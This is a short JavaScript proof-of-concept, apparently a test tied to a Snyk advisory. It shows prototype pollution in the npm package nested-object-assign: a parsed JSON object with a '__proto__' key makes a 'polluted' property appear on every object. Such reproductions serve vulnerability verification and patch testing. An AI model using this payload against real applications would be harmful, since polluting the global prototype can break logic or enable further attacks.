// //https://snyk.io/vuln/SNYK-JS-NESTEDOBJECTASSIGN-1065977

// test("prototype pollution in nested-object-assign", () => {
  const assign = require("nested-object-assign");
console.log({}.polluted);
  assign({}, JSON.parse('{"__proto__": {"polluted": "yes"}}'));

console.log({}.polluted);
// });
